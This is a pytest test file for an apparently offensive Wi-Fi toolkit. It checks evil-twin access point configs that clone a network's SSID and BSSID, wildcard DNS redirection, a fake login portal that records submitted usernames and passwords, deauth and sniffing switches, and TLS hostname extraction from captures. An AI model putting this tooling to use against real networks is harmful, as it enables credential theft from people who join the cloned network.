"""Rogue AP pieces: config builders, the portal server, and HTTPS metadata."""

import json
import struct
import urllib.request

from omni.wifi import portal, rogue, tlsmeta

AP = bytes.fromhex("001122334455")
STA = bytes.fromhex("66778899aabb")


# -- config builders --------------------------------------------------------

def test_hostapd_clone_is_wpa2_and_keeps_the_real_bssid():
    conf = rogue.hostapd_conf("wlan1", "HomeNet", 11, "aa:bb:cc:dd:ee:ff",
                              "hunter22")
    assert "ssid=HomeNet" in conf
    assert "bssid=aa:bb:cc:dd:ee:ff" in conf
    assert "wpa_passphrase=hunter22" in conf
    assert "wpa=2" in conf and "channel=11" in conf
    assert "interface=wlan1" in conf


def test_hostapd_without_a_key_is_open():
    conf = rogue.hostapd_conf("wlan1", "FreeWiFi", 6)
    assert "wpa=0" in conf and "wpa_passphrase" not in conf
    assert "bssid=" not in conf


def test_hostapd_5ghz_uses_a_mode():
    assert "hw_mode=a" in rogue.hostapd_conf("w", "x", 36)
    assert "hw_mode=g" in rogue.hostapd_conf("w", "x", 6)


def test_dnsmasq_portal_mode_wildcards_every_name():
    conf = rogue.dnsmasq_conf("wlan1", portal=True)
    assert "address=/#/10.0.0.1" in conf
    assert "dhcp-option=3,10.0.0.1" in conf
    assert "log-queries" in conf


def test_dnsmasq_without_portal_forwards_dns():
    conf = rogue.dnsmasq_conf("wlan1", upstream="9.9.9.9")
    assert "server=9.9.9.9" in conf
    assert "address=/#/" not in conf


def test_nat_rules_masquerade_and_forward():
    flat = [" ".join(a) for a in rogue.nat_rules("eth0", "wlan1")]
    assert any("MASQUERADE" in line and "eth0" in line for line in flat)
    assert any("ip_forward=1" in line for line in flat)


def test_nat_cleanup_mirrors_the_rules():
    added = rogue.nat_rules("eth0", "wlan1")
    removed = [" ".join(a) for a in rogue.nat_cleanup("eth0", "wlan1")]
    assert len(added) - 1 == len(removed)          # sysctl has no counterpart
    assert all("-D" in line for line in removed)


def test_parse_stations_reads_both_formats():
    dump = "Station AA:BB:CC:DD:EE:FF (on wlan1)\n\tsignal: -40 dBm\n"
    log = "wlan1: AP-STA-CONNECTED 11:22:33:44:55:66"
    assert rogue.parse_stations(dump) == ["AA:BB:CC:DD:EE:FF"]
    assert rogue.parse_stations(log) == ["11:22:33:44:55:66"]


APS = [
    {"ssid": "Cafe", "bssid": "AA:BB:CC:00:00:01", "channel": 11,
     "signal": -70, "security": "WPA3"},
    {"ssid": "Office", "bssid": "AA:BB:CC:00:00:02", "channel": 6,
     "signal": -60, "security": "WPA2"},
    {"ssid": "", "bssid": "AA:BB:CC:00:00:03", "channel": 1,
     "signal": -30, "security": "OPEN"},
    {"ssid": "Guest", "bssid": "AA:BB:CC:00:00:04", "channel": 6,
     "signal": -80, "security": "WPA2"},
]


def test_choose_target_prefers_a_joinable_wpa2_network():
    best = rogue.choose_target(APS)
    assert best["ssid"] == "Office"                # WPA2 beats WPA3 and signal
    assert best["bssid"] == "aa:bb:cc:00:00:02"    # lower-cased for hostapd
    assert best["channel"] == 6


def test_choose_target_needs_an_ssid_and_a_channel():
    assert rogue.choose_target([]) is None
    assert rogue.choose_target([{"ssid": "x", "bssid": "", "signal": -40,
                                 "security": "OPEN"}]) is None


def test_default_uplink_reads_the_route_table():
    table = ("default via 192.168.1.1 dev eth0 proto dhcp metric 100\n"
             "default via 10.0.0.1 dev wlan1 metric 600\n"
             "192.168.1.0/24 dev eth0 proto kernel scope link\n")
    assert rogue.default_uplink(table) == "eth0"
    assert rogue.default_uplink(table, skip=("eth0",)) == "wlan1"
    assert rogue.default_uplink("") == ""


def test_portal_page_has_the_form():
    page = rogue.portal_page("Airport")
    assert 'name="username"' in page and 'name="password"' in page
    assert "Airport" in page


def test_slug_is_safe():
    assert rogue.slug("My Net/2.4") == "My_Net_2.4"
    assert rogue.slug("") == "ssid"


# -- the portal server ------------------------------------------------------

def test_portal_serves_the_form_for_any_path():
    with portal.Portal(0, title="Airport") as served:
        url = f"http://127.0.0.1:{served.port}/generate_204"
        body = urllib.request.urlopen(url, timeout=5).read().decode()
        assert 'name="password"' in body
        assert "/generate_204" in served.hits


def test_portal_records_a_submission(tmp_path):
    log = tmp_path / "portal.jsonl"
    with portal.Portal(0, title="Airport", log_path=str(log)) as served:
        data = b"username=bob%40mail.test&password=pw123"
        urllib.request.urlopen(f"http://127.0.0.1:{served.port}/login",
                               data=data, timeout=5).read()
        assert served.captured[0].fields["user"] == "bob@mail.test"
        assert served.rows()[0][2] == "pw123"
    saved = json.loads(log.read_text().splitlines()[0])
    assert saved["user"] == "bob@mail.test" and saved["pass"] == "pw123"


def test_parse_fields_prefers_known_names():
    fields = portal.parse_fields(b"email=e%40x.test&pwd=secret&other=1")
    assert fields["user"] == "e@x.test" and fields["pass"] == "secret"
    assert fields["other"] == "1"


def test_parse_fields_tolerates_junk():
    assert portal.parse_fields(b"")["user"] == ""


# -- HTTPS metadata ---------------------------------------------------------

def cert_der(name: bytes) -> bytes:
    """Minimal DER carrying a commonName (what cert_names walks)."""
    return (b"\x30\x82\x01\x00" + tlsmeta.OID_CN + b"\x0c"
            + bytes([len(name)]) + name)


def pcap_with(path, frames) -> None:
    from test_wifi_extract import write_pcap

    write_pcap(path, frames)


def tcp_frame(src, dst, sport, dport, payload) -> bytes:
    from test_wifi_extract import ipv4_tcp, mac_header

    inner = ipv4_tcp(src, dst, sport, dport, 1, payload)
    return mac_header(0x01, AP, STA, b"\xde\xad\xbe\xef\x00\x01") + inner


def tls_hello(server_name: bytes) -> bytes:
    ext = b"\x00\x00" + struct.pack(">H", len(server_name) + 5)
    ext += struct.pack(">H", len(server_name) + 3) + b"\x00"
    ext += struct.pack(">H", len(server_name)) + server_name
    return b"\x16\x03\x01" + b"\x00\x00" + b"\x00" * 40 + ext + cert_der(
        server_name)


def test_cert_names_reads_the_common_name():
    assert tlsmeta.cert_names(cert_der(b"secure.example.com")) == [
        "secure.example.com"]


def test_report_reads_sni_and_cert(tmp_path):
    pcap = tmp_path / "tls.pcap"
    pcap_with(pcap, [tcp_frame(b"\x0a\x00\x00\x02", b"\x0a\x00\x00\x01",
                               50000, 443, tls_hello(b"bank.example.com"))])
    report = tlsmeta.report(str(pcap))
    assert "bank.example.com" in report["sni"]
    assert "bank.example.com" in report["cert_cn"]
    assert report["deterministic"]


def test_report_notes_encrypted_frames(tmp_path):
    from test_wifi_extract import build_pcap

    pcap = tmp_path / "ccmp.pcap"
    build_pcap(pcap)
    assert tlsmeta.report(str(pcap))["encrypted_frames"] >= 1


def test_scan_ignores_non_tls(tmp_path):
    pcap = tmp_path / "plain.pcap"
    pcap_with(pcap, [tcp_frame(b"\x0a\x00\x00\x02", b"\x0a\x00\x00\x01",
                               50000, 80, b"GET / HTTP/1.1\r\n\r\n")])
    assert tlsmeta.scan(str(pcap)) == []


# -- the modules around it --------------------------------------------------

def test_pineapple_switches_the_hostile_parts_on(monkeypatch):
    from omni.wifi.modules import evil

    seen = {}

    def fake(self):
        seen.update({name: self.get(name)
                     for name in ("SSID", "PORTAL", "SNIFF", "DEAUTH")})
        return seen

    monkeypatch.setattr(evil.Eviltwin, "execute", fake)
    evil.Pineapple(**{"ssid": "Cafe", "mon": "wlan1mon"}).execute()
    assert seen["SSID"] == "Cafe"
    assert seen["PORTAL"] == "true" and seen["SNIFF"] == "true"
    assert seen["DEAUTH"] == "true"


def test_pineapple_without_a_monitor_leaves_deauth_off(monkeypatch):
    from omni.wifi.modules import evil

    seen = {}
    monkeypatch.setattr(evil.Eviltwin, "execute",
                        lambda self: seen.update(deauth=self.get("DEAUTH")))
    evil.Pineapple(**{"ssid": "Cafe"}).execute()
    assert seen["deauth"] == "false"


def test_pineapple_recon_fills_in_a_target_when_the_ssid_is_blank(monkeypatch):
    from omni.wifi.modules import evil

    seen = {}

    def fake_execute(self):
        seen.update({name: self.get(name)
                     for name in ("SSID", "BSSID", "CHANNEL", "IFACE",
                                  "PORTAL", "SNIFF", "LIVE")})
        return seen

    monkeypatch.setattr(evil.Eviltwin, "execute", fake_execute)
    monkeypatch.setattr(evil.scan_mod, "scan_iw", lambda iface: APS)
    evil.Pineapple(**{"iface": "wlan1", "live": "false"}).execute()
    assert seen["SSID"] == "Office" and seen["BSSID"] == "aa:bb:cc:00:00:02"
    assert seen["CHANNEL"] == "6" and seen["IFACE"] == "wlan1"
    assert seen["PORTAL"] == "true" and seen["SNIFF"] == "true"
    assert seen["LIVE"] == "false"


def test_pineapple_without_an_ssid_or_a_scan_is_an_error(monkeypatch):
    import pytest

    from omni.wifi.modules import evil

    monkeypatch.setattr(evil.scan_mod, "scan_iw", lambda iface: [])
    with pytest.raises(ValueError, match="nothing to clone"):
        evil.Pineapple(**{"iface": "wlan1"}).execute()


def test_resolve_uplink_asks_the_route_table(monkeypatch):
    from omni.core import proc as core_proc
    from omni.wifi.modules import evil

    caption = core_proc.Result(["ip", "route", "show", "default"], 0,
                               "default via 192.168.1.1 dev eth0 proto dhcp\n",
                               "")
    monkeypatch.setattr(evil.proc, "run", lambda *a, **k: caption)
    assert evil.resolve_uplink("auto", "wlan1") == "eth0"
    assert evil.resolve_uplink("eth1") == "eth1"



def test_tls_module_writes_the_report(tmp_path):
    from omni.wifi.modules.tls import Tls

    pcap = tmp_path / "capture.pcap"
    pcap_with(pcap, [tcp_frame(b"\x0a\x00\x00\x02", b"\x0a\x00\x00\x01",
                               50000, 443, tls_hello(b"shop.example.com"))])
    out = tmp_path / "out"
    report = Tls(**{"pcap": str(pcap), "out": str(out)}).run()
    assert "shop.example.com" in report["hosts"]
    saved = json.loads((out / "tls.json").read_text())
    assert saved["hosts"] == report["hosts"]


def test_registry_exposes_the_rogue_trades():
    from omni.core.module import registry

    names = {mod.NAME for mod in registry.all("wifi")}
    assert {"wifi.eviltwin", "wifi.pineapple", "wifi.tls"} <= names
